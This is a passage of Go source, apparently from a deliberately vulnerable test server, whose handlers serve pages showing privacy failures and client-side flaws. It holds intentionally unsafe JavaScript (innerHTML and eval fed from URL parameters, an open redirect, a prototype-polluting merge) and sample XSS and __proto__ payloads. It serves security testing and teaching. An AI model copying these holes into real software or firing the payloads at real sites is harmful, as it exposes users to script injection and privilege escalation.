</script>`, h.randomHex(rng, 8), h.randomHex(rng, 24), h.randomHex(rng, 16))

	body := fmt.Sprintf(`<h2>Welcome to Acme Corp</h2>
<p>Your personalized experience is loading...</p>
<div class="card">
<h3>Today's Recommendations</h3>
<p>Based on your browsing history across 47 partner sites, we think you'll love these products.</p>
</div>
<!-- Tracking Pixels (16 third-party trackers) -->
%s
<!-- Cross-domain fingerprinting -->
%s
<!-- Third-party cookies -->
<script>
var domains = ['ads.example.com','track.example.net','pixel.example.org','data.example.io','sync.example.co'];
domains.forEach(function(d) {
    var i = document.createElement('iframe');
    i.src = 'https://' + d + '/sync?uid=%s';
    i.width = 0; i.height = 0; i.style.display = 'none';
    document.body.appendChild(i);
});
</script>`, pixels.String(), fpScript, h.randomHex(rng, 16))

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Welcome - Personalized Experience", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P2: Excessive Data Collection
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacyDataCollection(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-excessive-data-collection")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	body := `<h2>Account Registration</h2>
<p>Please complete all fields to create your free account. All fields are required.</p>
<form method="POST" action="/vuln/privacy-risks/data-collection">
  <div class="card">
    <h3>Personal Information</h3>
    <label>Full Legal Name *</label><br><input type="text" name="full_name" required style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Date of Birth *</label><br><input type="date" name="dob" required style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Social Security Number *</label><br><input type="text" name="ssn" placeholder="XXX-XX-XXXX" required style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Mother's Maiden Name *</label><br><input type="text" name="mothers_maiden" required style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Place of Birth *</label><br><input type="text" name="birth_place" required style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Passport Number</label><br><input type="text" name="passport" style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Driver's License Number *</label><br><input type="text" name="drivers_license" required style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Ethnic Background *</label><br>
    <select name="ethnicity" required style="width:100%;padding:8px;margin:4px 0 12px">
      <option value="">Select...</option>
      <option>Asian</option><option>Black</option><option>Hispanic</option><option>White</option><option>Other</option>
    </select><br>
    <label>Religion</label><br><input type="text" name="religion" style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Political Affiliation</label><br><input type="text" name="political" style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Sexual Orientation</label><br><input type="text" name="orientation" style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Annual Household Income *</label><br><input type="text" name="income" required style="width:100%;padding:8px;margin:4px 0 12px"><br>
  </div>
  <div class="card">
    <h3>Health Information</h3>
    <label>Blood Type</label><br><input type="text" name="blood_type" style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Known Allergies *</label><br><textarea name="allergies" required style="width:100%;padding:8px;margin:4px 0 12px"></textarea><br>
    <label>Current Medications</label><br><textarea name="medications" style="width:100%;padding:8px;margin:4px 0 12px"></textarea><br>
    <label>Mental Health History</label><br><textarea name="mental_health" style="width:100%;padding:8px;margin:4px 0 12px"></textarea><br>
  </div>
  <div class="card">
    <h3>Financial Information</h3>
    <label>Bank Account Number</label><br><input type="text" name="bank_account" style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Routing Number</label><br><input type="text" name="routing" style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <label>Credit Score Range</label><br><input type="text" name="credit_score" style="width:100%;padding:8px;margin:4px 0 12px"><br>
  </div>
  <p style="font-size:11px;color:#999">By submitting, you agree to our data processing practices. This data may be shared with partners. See our <a href="/vuln/privacy-risks/non-transparent">Privacy Policy</a>.</p>
  <button type="submit" style="background:#00b894;color:#fff;padding:12px 32px;border:none;border-radius:6px;cursor:pointer;font-size:16px">Create Free Account</button>
</form>`

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Create Account", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P3: Inadequate Breach Response
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacyInadequateBreach(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-inadequate-breach")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	body := fmt.Sprintf(`<h2>Security Incident Notice</h2>
<div class="warning">
  <strong>Notice dated: January 15, 2026</strong><br>
  Incident occurred: September 3, 2025 (134 days ago)
</div>
<div class="card">
  <h3>What Happened</h3>
  <p>We recently became aware of a security incident that <em>may</em> have involved some of your information.
  An unauthorized party <em>may</em> have accessed certain systems containing user data. We are still investigating.</p>
  <h3>What Information Was Involved</h3>
  <p>The following data <em>may</em> have been accessed:</p>
  <ul>
    <li>Names and email addresses</li>
    <li>"Some additional account information"</li>
  </ul>
  <p style="font-size:12px;color:#999">(Note: we are not disclosing that passwords, SSNs, financial data, and health records were also compromised)</p>
  <h3>What We Are Doing</h3>
  <p>We take security seriously. We have engaged a leading cybersecurity firm and are working diligently to investigate this matter.</p>
  <h3>What You Can Do</h3>
  <p>As a precaution, you may wish to remain vigilant and monitor your accounts.</p>
</div>
<div class="card">
  <h3>Internal Breach Timeline (LEAKED)</h3>
  <table>
    <tr><th>Date</th><th>Event</th><th>Status</th></tr>
    <tr><td>2025-09-03</td><td>Initial unauthorized access detected by SIEM</td><td>Alert ignored</td></tr>
    <tr><td>2025-09-17</td><td>Second alert - data exfiltration pattern</td><td>Marked as false positive</td></tr>
    <tr><td>2025-10-22</td><td>Customer reports suspicious activity</td><td>Support ticket opened</td></tr>
    <tr><td>2025-11-05</td><td>Engineering confirms breach</td><td>Executive briefed</td></tr>
    <tr><td>2025-11-19</td><td>Legal advises delaying notification</td><td>PR strategy drafted</td></tr>
    <tr><td>2025-12-10</td><td>Breach data appears on dark web</td><td>Media inquiry received</td></tr>
    <tr><td>2026-01-15</td><td>Public notification issued (134 days late)</td><td>Minimized scope</td></tr>
  </table>
</div>
<div class="card">
  <h3>Actual Scope (Undisclosed)</h3>
  <p>Records affected: <strong>%d</strong> (disclosed as "a small number of users")</p>
  <p>Data types: names, emails, passwords (plaintext), SSNs, payment cards, health records, location data</p>
  <p>Regulatory notifications: GDPR (72hr deadline missed), CCPA (45-day deadline missed), HIPAA (60-day deadline missed)</p>
</div>`, rng.Intn(5000000)+1000000)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Security Incident Notice", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P4: Insufficient Data Deletion
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacyInsufficientDeletion(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-insufficient-deletion")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	userName := h.randomName(rng)
	userEmail := h.randomEmail(rng)

	body := fmt.Sprintf(`<h2>Delete My Account</h2>
<div class="card">
  <h3>Account: %s (%s)</h3>
  <p>We're sorry to see you go. Click below to delete your account.</p>
  <button onclick="deleteAccount()" style="background:#d63031;color:#fff;padding:12px 24px;border:none;border-radius:6px;cursor:pointer">Delete My Account</button>
</div>
<div id="result" style="display:none">
  <div class="card">
    <h3>Account "Deleted"</h3>
    <p style="color:#00b894;font-weight:bold">Your account has been successfully deleted.</p>
    <p style="font-size:12px;color:#999">You will receive a confirmation email within 30 days.</p>
  </div>
  <div class="card" style="border-left:4px solid #d63031">
    <h3>API Response (Internal Debug Log)</h3>
    <pre>{
  "action": "soft_delete",
  "hard_delete": false,
  "user_id": %d,
  "email": "%s",
  "status": "deactivated",
  "data_retained": true,
  "retention_period": "indefinite",
  "backup_copies": 7,
  "backup_deletion_scheduled": false,
  "analytics_data_retained": true,
  "third_party_deletion_requested": false,
  "marketing_list_removal": false,
  "search_index_removal": false,
  "data_broker_notification": false,
  "actual_tables_affected": [
    "users.status = 'inactive'",
    "users.login_enabled = false"
  ],
  "tables_NOT_modified": [
    "user_profiles (name, address, phone, ssn)",
    "user_financial (credit_cards, bank_accounts)",
    "user_health (medical_records, prescriptions)",
    "user_activity_log (full browsing history)",
    "user_location_history (GPS coordinates)",
    "user_communications (emails, messages)",
    "analytics_events (behavioral profile)",
    "ad_targeting_profile (interests, demographics)"
  ]
}</pre>
  </div>
</div>
<script>
function deleteAccount() {
    document.getElementById('result').style.display = 'block';
    window.scrollTo(0, document.getElementById('result').offsetTop);
}
</script>`, userName, userEmail, rng.Intn(90000)+10000, userEmail)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Delete Account", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P5: Non-transparent Policies
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacyNonTransparent(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-non-transparent")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	body := `<h2>Privacy Policy</h2>
<p style="font-size:11px;color:#ccc">Last updated: January 1, 2020 | Version 47.3 | 28,491 words</p>
<div class="card" style="font-size:12px;line-height:1.4;max-height:600px;overflow-y:scroll">
<p>SECTION 1. DEFINITIONS AND INTERPRETATION</p>
<p>For the purposes of this Privacy Policy ("Policy"), the terms "we," "us," "our," and "Company" refer to Acme Corporation and its subsidiaries, affiliates, partners, successors, assigns, and any entity that controls, is controlled by, or is under common control with the Company, including but not limited to entities formed in the future that may process your data under this Policy or any successor policy hereto. "Personal Data" shall mean any information that, alone or in combination with other data available to us or our partners...</p>

<p>SECTION 7(b)(iii). DATA SHARING AND TRANSFER</p>
<p>We may share, transfer, sell, license, sublicense, or otherwise make available your Personal Data, including but not limited to Sensitive Personal Data as defined in Section 2(q)(iv), to selected third parties including but not limited to: advertising networks, data brokers, analytics providers, social media platforms, insurance companies, financial institutions, government agencies (where required or where we determine disclosure to be in our interest), employers (current or prospective), and any acquirer of all or substantially all of our assets. Such sharing shall be deemed to have been consented to by your continued use of any of our services, websites, applications, or related platforms.</p>

<p>SECTION 12(a). OPT-OUT RIGHTS</p>
<p>You may opt out of certain data processing activities by sending a notarized letter via certified mail to our Data Protection Officer at: Acme Corporation, Attn: Privacy Opt-Out Processing Department, Suite 4700, 1 Corporate Plaza, Wilmington, DE 19801. Please allow 180 business days for processing. Opt-out requests must include a government-issued photo ID, proof of address dated within 30 days, and a processing fee of $25.00 (non-refundable). Opt-out does not apply to data already shared with third parties, data required for "legitimate business interests" (as solely determined by us), or data collected prior to the opt-out effective date.</p>

<p>SECTION 19. AUTOMATED DECISION-MAKING</p>
<p>We use automated systems, including machine learning and artificial intelligence, to make decisions that may significantly affect you, including credit decisions, insurance eligibility, employment screening, and content moderation. You may request human review by following the procedure in Section 12(a).</p>

<p style="font-size:10px;color:#ddd">SECTION 23(f). By using our services, you irrevocably consent to the collection, storage, processing, transfer, and sale of all data described herein, including data collected by third-party tracking technologies, browser fingerprinting, cross-device tracking, and offline data sources. This consent survives account termination.</p>
</div>
<p style="font-size:11px;margin-top:12px"><a href="#" style="color:#ccc">View full policy (28,491 words)</a> | <a href="#" style="color:#ccc">Request opt-out form</a></p>`

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Privacy Policy", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P6: Insufficient Consent Management
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacyInsufficientConsent(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-insufficient-consent")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = rng

	body := `<h2>Cookie Preferences</h2>
<div class="card">
<p>We use cookies to enhance your experience. By continuing to browse, you accept our use of cookies.</p>
</div>

<!-- Dark pattern cookie banner -->
<div id="cookie-banner" style="position:fixed;bottom:0;left:0;right:0;background:#2d3436;color:#fff;padding:20px 32px;z-index:9999;box-shadow:0 -4px 12px rgba(0,0,0,0.3)">
  <div style="max-width:1200px;margin:0 auto;display:flex;align-items:center;gap:20px">
    <div style="flex:1">
      <strong>We value your privacy</strong>
      <p style="font-size:13px;color:#b2bec3;margin:4px 0 0">We and our 247 partners use cookies and similar technologies for advertising, analytics, social media, personalization, and more.</p>
    </div>
    <div style="display:flex;gap:8px;flex-shrink:0">
      <button onclick="document.getElementById('cookie-banner').style.display='none'" style="background:#00b894;color:#fff;padding:12px 32px;border:none;border-radius:6px;cursor:pointer;font-size:16px;font-weight:bold">Accept All</button>
      <button onclick="document.getElementById('cookie-settings').style.display='block'" style="background:transparent;color:#636e72;padding:12px 16px;border:1px solid #636e72;border-radius:6px;cursor:pointer;font-size:11px">More Options</button>
    </div>
  </div>
</div>

<div id="cookie-settings" style="display:none">
<div class="card">
  <h3>Cookie Settings</h3>
  <p style="font-size:12px;color:#999">Toggle categories below. Essential cookies cannot be disabled.</p>
  <table>
    <tr>
      <td><strong>Essential Cookies</strong><br><span style="font-size:11px;color:#999">Required for site functionality</span></td>
      <td><input type="checkbox" checked disabled> Always Active</td>
    </tr>
    <tr>
      <td><strong>Analytics & Performance</strong><br><span style="font-size:11px;color:#999">Help us understand site usage</span></td>
      <td><input type="checkbox" checked id="analytics-check"></td>
    </tr>
    <tr>
      <td><strong>Advertising & Targeting</strong><br><span style="font-size:11px;color:#999">Personalized ads across the web</span></td>
      <td><input type="checkbox" checked id="ads-check"></td>
    </tr>
    <tr>
      <td><strong>Social Media Integration</strong><br><span style="font-size:11px;color:#999">Share content and track interactions</span></td>
      <td><input type="checkbox" checked id="social-check"></td>
    </tr>
    <tr>
      <td><strong>Data Sharing with Partners</strong><br><span style="font-size:11px;color:#999">Share data with 247 advertising partners</span></td>
      <td><input type="checkbox" checked id="sharing-check"></td>
    </tr>
    <tr>
      <td><strong>Cross-Device Tracking</strong><br><span style="font-size:11px;color:#999">Link your activity across devices</span></td>
      <td><input type="checkbox" checked id="crossdev-check"></td>
    </tr>
  </table>
  <div style="margin-top:16px;display:flex;gap:8px">
    <button onclick="document.getElementById('cookie-banner').style.display='none';document.getElementById('cookie-settings').style.display='none'" style="background:#00b894;color:#fff;padding:10px 24px;border:none;border-radius:6px;cursor:pointer">Save Preferences</button>
    <button onclick="alert('Note: Unchecking boxes does not actually disable tracking. All categories are loaded regardless of selection.')" style="background:transparent;color:#636e72;padding:10px 16px;border:1px solid #dfe6e9;border-radius:6px;cursor:pointer;font-size:11px">Reject Non-Essential</button>
  </div>
  <p style="font-size:10px;color:#ccc;margin-top:12px">Note: Preferences are stored for 24 hours. Pre-checked categories are re-enabled on each visit. "Reject" button processes your preference but does not prevent data collection already in progress.</p>
</div>
</div>

<script>
// Dark pattern: all checkboxes re-check themselves after 2 seconds
setTimeout(function() {
    ['analytics-check','ads-check','social-check','sharing-check','crossdev-check'].forEach(function(id) {
        document.getElementById(id).checked = true;
    });
}, 2000);
// Tracking loads regardless of consent state
var _t = new Image(); _t.src = 'https://tracker.example.com/consent-bypass?uid=' + Math.random();
</script>`

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Cookie Preferences", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P7: Collection of Data Not Required for Purpose
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacyCollectionNotRequired(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-collection-not-required")

	resp := toJSON(map[string]interface{}{
		"app":     "SimpleWeather",
		"version": "2.1.0",
		"purpose": "Display current weather for user location",
		"data_collected": map[string]interface{}{
			"location": map[string]interface{}{
				"gps_lat":       fmt.Sprintf("%.6f", 37.0+rng.Float64()*5),
				"gps_lng":       fmt.Sprintf("%.6f", -122.0+rng.Float64()*5),
				"accuracy_m":    fmt.Sprintf("%.1f", rng.Float64()*10+1),
				"altitude_m":    fmt.Sprintf("%.1f", rng.Float64()*500),
				"speed_ms":      fmt.Sprintf("%.1f", rng.Float64()*30),
				"heading":       rng.Intn(360),
				"tracking_mode": "continuous_background",
				"history_days":  365,
			},
			"device": map[string]interface{}{
				"device_id":     fmt.Sprintf("dev_%s", h.randomHex(rng, 16)),
				"advertising_id": h.randomHex(rng, 32),
				"model":         "Pixel 8 Pro",
				"os_version":    "Android 15",
				"carrier":       "T-Mobile",
				"wifi_ssid":     fmt.Sprintf("HOME-%s", h.randomHex(rng, 4)),
				"wifi_bssid":    fmt.Sprintf("%s:%s:%s:%s:%s:%s", h.randomHex(rng, 2), h.randomHex(rng, 2), h.randomHex(rng, 2), h.randomHex(rng, 2), h.randomHex(rng, 2), h.randomHex(rng, 2)),
				"bluetooth_devices_nearby": rng.Intn(15) + 1,
				"battery_level": rng.Intn(100),
				"storage_free_gb": rng.Intn(128),
				"installed_apps_count": rng.Intn(200) + 50,
			},
			"contacts_count": rng.Intn(500) + 100,
			"photos_count":   rng.Intn(10000) + 1000,
			"calendar_events": rng.Intn(200) + 50,
		},
		"permissions_requested": []string{
			"ACCESS_FINE_LOCATION", "ACCESS_BACKGROUND_LOCATION",
			"READ_CONTACTS", "READ_CALENDAR", "READ_CALL_LOG",
			"CAMERA", "RECORD_AUDIO", "READ_EXTERNAL_STORAGE",
			"READ_PHONE_STATE", "ACCESS_WIFI_STATE", "BLUETOOTH_SCAN",
		},
		"_analysis": map[string]interface{}{
			"required_for_weather":      []string{"ACCESS_COARSE_LOCATION"},
			"not_required_for_weather":  10,
			"data_sent_to":             "analytics.adnetwork.example.com",
			"purpose_limitation_violation": true,
		},
	})

	h.mobileHeaders(w, rng)
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P8: Sharing Data with Third Parties Without Consent
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacySharingWithoutConsent(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-sharing-without-consent")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	var partners strings.Builder
	partnerNames := []string{
		"AdVantage Media", "BlueOcean Analytics", "ClearPath Data", "DataMine Solutions",
		"EngageIQ", "FocusTarget", "GrowthStack", "HyperMetrics", "InsightBridge",
		"JunctionPoint Data", "KeyMetric Systems", "LeadGenX", "MarketPulse",
		"NexGen Audiences", "OptConnect", "PredictAI", "QuantumReach", "ReachMore Media",
		"SignalFire Analytics", "TargetScope", "UnifyData", "VantagePoint Systems",
		"WaveLength Media", "XplorData", "YieldMax", "ZenithTrack",
		"360DataLabs", "AcuBid Networks", "BehaviorSync", "CivicProfile",
		"DemographIQ", "EventGraph", "FinanceTrack Pro", "GeoFence Corp",
		"HealthData Exchange", "IdentityLink", "JointVenture Data", "KnowledgeBase AI",
		"LifestyleMetrics", "MobileFirst Analytics", "NetReach Global", "OmniChannel Data",
		"PersonaBuilder", "QueryMaster", "RetargetPro", "SocialGraph Inc",
		"TrueIntent Media", "UserJourney Labs", "VisitorIQ", "WebPrint Analytics",
	}

	categories := []string{"Advertising", "Analytics", "Data Broker", "Insurance", "Financial", "Healthcare", "Government", "Employment"}

	for i, name := range partnerNames {
		cat := categories[rng.Intn(len(categories))]
		country := []string{"US", "CN", "RU", "IN", "UK", "IL", "SG", "AE"}[rng.Intn(8)]
		partners.WriteString(fmt.Sprintf(`<tr><td>%d</td><td>%s</td><td>%s</td><td>%s</td><td style="color:#d63031">No consent obtained</td></tr>%s`, i+1, name, cat, country, "\n"))
	}

	body := fmt.Sprintf(`<h2>Data Sharing Partners</h2>
<div class="warning">This page was not intended to be publicly accessible. It lists all third-party data sharing agreements.</div>
<div class="card">
  <h3>Active Data Sharing Agreements (%d Partners)</h3>
  <p>User data is shared with the following entities. Users were not individually notified of these sharing arrangements.</p>
  <div style="max-height:500px;overflow-y:scroll">
  <table>
    <tr><th>#</th><th>Partner</th><th>Category</th><th>Jurisdiction</th><th>Consent Status</th></tr>
    %s
  </table>
  </div>
</div>
<div class="card">
  <h3>Data Categories Shared</h3>
  <ul>
    <li>Full name, email, phone number, mailing address</li>
    <li>Browsing history and search queries (365 days)</li>
    <li>Purchase history and transaction amounts</li>
    <li>Device identifiers and IP addresses</li>
    <li>Location data (GPS coordinates, Wi-Fi triangulation)</li>
    <li>Health and wellness data from connected apps</li>
    <li>Financial indicators (income range, credit behavior)</li>
    <li>Social connections and communication patterns</li>
    <li>Inferred demographics (age, gender, ethnicity, political leaning)</li>
  </ul>
</div>`, len(partnerNames), partners.String())

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Data Sharing Partners", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P9: Outdated Personal Data
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacyOutdatedData(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-outdated-personal-data")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	name := h.randomName(rng)
	body := fmt.Sprintf(`<h2>User Profile</h2>
<div class="card">
  <h3>%s</h3>
  <table>
    <tr><th>Field</th><th>Value</th><th>Last Updated</th><th>Editable</th></tr>
    <tr><td>Full Name</td><td>%s</td><td>2019-03-14</td><td style="color:#d63031">No</td></tr>
    <tr><td>Email</td><td>%s</td><td>2019-03-14</td><td style="color:#d63031">No (contact support)</td></tr>
    <tr><td>Phone</td><td>+1-%03d-%03d-%04d</td><td>2019-03-14</td><td style="color:#d63031">No</td></tr>
    <tr><td>Address</td><td>%d Old Street, Former City, ST %05d</td><td>2019-03-14</td><td style="color:#d63031">No</td></tr>
    <tr><td>Employer</td><td>Previous Company Inc (dissolved 2021)</td><td>2019-03-14</td><td style="color:#d63031">No</td></tr>
    <tr><td>Job Title</td><td>Junior Associate</td><td>2019-03-14</td><td style="color:#d63031">No</td></tr>
    <tr><td>Marital Status</td><td>Single</td><td>2019-03-14</td><td style="color:#d63031">No</td></tr>
    <tr><td>Income Range</td><td>$30,000-$40,000</td><td>2019-03-14</td><td style="color:#d63031">No</td></tr>
    <tr><td>Credit Score</td><td>620</td><td>2020-01-01</td><td style="color:#d63031">No</td></tr>
    <tr><td>Photo</td><td><em>Profile photo from 2019</em></td><td>2019-03-14</td><td style="color:#d63031">No</td></tr>
  </table>
</div>
<div class="warning">
  <strong>No self-service update mechanism available.</strong><br>
  To update your profile, please mail a notarized change request form to our headquarters.
  Allow 90 business days for processing. A $15 administrative fee applies per field change.
</div>
<div class="card">
  <h3>Data Quality Issues</h3>
  <ul>
    <li>Profile data is 7 years old with no automatic refresh</li>
    <li>No mechanism for users to self-update their information</li>
    <li>Outdated data actively used for credit decisions and ad targeting</li>
    <li>Employer information references a dissolved company</li>
    <li>Income and credit score data severely outdated</li>
    <li>No data accuracy verification process exists</li>
    <li>Third parties receive this stale data as "current"</li>
  </ul>
</div>`, name, name, h.randomEmail(rng),
		rng.Intn(900)+100, rng.Intn(900)+100, rng.Intn(10000),
		rng.Intn(9000)+1000, rng.Intn(90000)+10000)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("User Profile", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// P10: Insufficient Session Expiry
// ---------------------------------------------------------------------------

func (h *Handler) servePrivacySessionExpiry(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "privacy-insufficient-session-expiry")

	token := h.randomHex(rng, 64)

	// Set an absurdly long-lived cookie
	w.Header().Set("Set-Cookie", fmt.Sprintf("session_id=%s; Path=/; Max-Age=31536000; HttpOnly", token))

	resp := toJSON(map[string]interface{}{
		"session": map[string]interface{}{
			"token":           token,
			"created":         "2025-01-01T00:00:00Z",
			"expires":         "2025-12-31T23:59:59Z",
			"max_age_seconds": 31536000,
			"max_age_days":    365,
			"idle_timeout":    "none",
			"absolute_timeout": "none",
			"rotation":        false,
			"revocable":       false,
		},
		"logout_endpoint": "none",
		"session_management": map[string]interface{}{
			"concurrent_sessions_limit": "unlimited",
			"session_binding":           "none",
			"ip_validation":             false,
			"device_validation":         false,
			"geo_validation":            false,
			"force_logout_capability":   false,
			"session_listing":           false,
		},
		"_vulnerabilities": []string{
			"Session token valid for 365 days without renewal",
			"No idle timeout - abandoned sessions remain valid",
			"No logout endpoint available to users",
			"No session rotation after privilege changes",
			"Unlimited concurrent sessions allowed",
			"No IP or device binding on session",
			"Stolen tokens cannot be revoked",
			"No session listing for users to audit active sessions",
		},
	})

	h.mobileHeaders(w, rng)
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ===========================================================================
// Client-Side Security Top 10 Endpoints
// ===========================================================================

// ---------------------------------------------------------------------------
// C1: DOM-Based XSS
// ---------------------------------------------------------------------------

func (h *Handler) serveClientDOMXSS(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-dom-xss")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = rng

	body := `<h2>Search Results</h2>
<div id="search-output" class="card">
  <p>Loading results...</p>
</div>
<div id="welcome" class="card"></div>

<script>
// Vulnerable: innerHTML from URL hash
var hashValue = window.location.hash.substring(1);
if (hashValue) {
    document.getElementById('search-output').innerHTML = '<h3>Results for: ' + decodeURIComponent(hashValue) + '</h3><p>Found 0 results.</p>';
}

// Vulnerable: document.write from query parameters
var params = new URLSearchParams(window.location.search);
var name = params.get('name');
if (name) {
    document.write('<div class="card"><h3>Welcome, ' + name + '!</h3></div>');
}

// Vulnerable: eval of URL parameter
var callback = params.get('callback');
if (callback) {
    eval(callback + '({"status":"ok"})');
}

// Vulnerable: jQuery-style html() equivalent
var msg = params.get('msg');
if (msg) {
    document.getElementById('welcome').innerHTML = msg;
}

// Vulnerable: DOM clobbering setup
var config = {
    apiUrl: document.getElementById('config-api') ? document.getElementById('config-api').href : 'https://api.acme.com',
    debug: document.getElementById('config-debug') ? document.getElementById('config-debug').text : 'false'
};

// Vulnerable: location-based sink
var redir = params.get('next');
if (redir) {
    setTimeout(function() { window.location = redir; }, 5000);
}
</script>

<div class="card">
  <h3>Vulnerability Details</h3>
  <ul>
    <li><code>innerHTML</code> assignment from <code>window.location.hash</code> - DOM XSS via URL fragment</li>
    <li><code>document.write()</code> with unsanitized query parameter - classic DOM XSS</li>
    <li><code>eval()</code> of user-controlled <code>callback</code> parameter - code injection</li>
    <li><code>innerHTML</code> assignment from <code>msg</code> query parameter</li>
    <li>DOM clobbering via element ID collision with config object</li>
    <li><code>window.location</code> assignment from <code>next</code> parameter - open redirect</li>
  </ul>
  <p>Try: <code>?name=&lt;img src=x onerror=alert(1)&gt;</code> or <code>#&lt;svg onload=alert(1)&gt;</code></p>
</div>`

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Search", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C2: Prototype Pollution
// ---------------------------------------------------------------------------

func (h *Handler) serveClientPrototypePollution(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-prototype-pollution")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = rng

	body := `<h2>User Settings</h2>
<div class="card">
  <h3>Update Preferences</h3>
  <textarea id="settings-input" style="width:100%;height:120px;font-family:monospace;padding:8px" placeholder='{"theme":"dark","language":"en"}'></textarea>
  <br><button onclick="applySettings()" style="background:#00b894;color:#fff;padding:8px 20px;border:none;border-radius:4px;cursor:pointer;margin-top:8px">Apply Settings</button>
  <div id="settings-result" style="margin-top:12px"></div>
</div>

<script>
// Vulnerable: deep merge without prototype pollution protection
function deepMerge(target, source) {
    for (var key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Vulnerable: JSON.parse of raw user input merged into config
var appConfig = {
    theme: 'light',
    language: 'en',
    isAdmin: false,
    debugMode: false
};

function applySettings() {
    try {
        var userInput = JSON.parse(document.getElementById('settings-input').value);
        deepMerge(appConfig, userInput);
        document.getElementById('settings-result').innerHTML =
            '<pre>' + JSON.stringify(appConfig, null, 2) + '</pre>' +
            '<p>isAdmin: ' + appConfig.isAdmin + '</p>' +
            '<p>Object.prototype.isAdmin: ' + ({}).isAdmin + '</p>';
    } catch(e) {
        document.getElementById('settings-result').innerHTML = '<p style="color:red">Invalid JSON: ' + e.message + '</p>';
    }
}

// Vulnerable: URL parameter parsed and merged
var params = new URLSearchParams(window.location.search);
var configParam = params.get('config');
if (configParam) {
    try {
        deepMerge(appConfig, JSON.parse(configParam));
    } catch(e) {}
}
</script>

<div class="card">
  <h3>Vulnerability Details</h3>
  <ul>
    <li>Vulnerable <code>deepMerge()</code> function does not check for <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code> keys</li>
    <li>User input is parsed via <code>JSON.parse()</code> and directly merged into application config</li>
    <li>URL parameter <code>config</code> is also parsed and merged without validation</li>
  </ul>
  <p>Try: <code>{"__proto__":{"isAdmin":true}}</code> in the textarea above</p>
</div>`

	w.WriteHeader(http.StatusOK)
